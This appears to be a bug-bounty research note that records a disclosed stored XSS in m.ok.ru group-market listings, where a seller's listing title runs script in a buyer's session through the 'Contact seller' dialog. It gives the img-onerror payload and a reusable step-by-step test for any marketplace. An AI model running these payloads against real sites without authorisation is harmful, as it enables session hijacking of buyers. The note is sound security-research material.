CHAIN: an attacker (the SELLER) creates a group-market listing whose TITLE carries `"><img src=x onerror=alert(1)>` (primitive: a user-controlled listing title stored unsanitized) -> a victim (the BUYER) opens the listing and clicks "Contact seller" (primitive: the dialog reflects the title into `div.discus_dialogs_topic` unescaped) -> the payload executes in the BUYER's m.ok.ru session (escalation: cross-role stored XSS — seller to buyer) -> session/account compromise (final: stored XSS with session impact; program rated Critical). Per doctrine §8: precondition = the attacker can create a listing in a group market and the victim opens it and clicks "Contact seller"; gain = JavaScript in the victim's authenticated m.ok.ru session.
TRANSFERABLE TEST: on any marketplace/classifieds/group-market — (1) create a listing whose TITLE is `"><img src=x onerror=alert(document.domain)>`; (2) open the listing as a second (buyer) account and click "Contact seller" / "Message seller"; (3) inspect the dialog DOM for the title element and check whether the payload executed in the BUYER's session; (4) generalise the sink to every place the listing title is rendered (dialog topic, order chat, e-mail subject, admin moderation view). Rule: **a listing/product title reflected into a contact-seller dialog is a cross-role stored-XSS vector — the seller's title executes in the buyer's session.**
DEDUPE/DELTA: `302253`, `ok.ru`, `m.ok.ru`, `discus_dialogs_topic`, `Связаться с продавцом`, `contact seller`, `listing title` (as an XSS carrier) = 0 technique hits across the three write targets (the single `product name` hit is a generic writable-field list item at Bugbountyskills ~13532). Related-but-distinct REVIEWED and NOT re-recorded: §17.366 (#1122513 — a PROFILE free-text field rendered in a public profile page, not a listing title in a messaging dialog); §17.454 (#259100 Quora — a push-channel name reflected into an executable JS string, a different sink); the recorded stored-XSS carriers (admin notices, audit logs, profile fields, upload filenames). NEW: the listing-title -> contact-seller-dialog vector + the cross-role (seller -> buyer) delivery. New general method -> §17.637.
FRESHNESS: submitted 2018-01-03 / disclosed 2018-06-30 — OUTSIDE the preferred 6-12 month window (~8.4 years before this read); read because assigned; the class (a listing title reflected into a messaging dialog) is app-design-level and re-detectable on any marketplace.
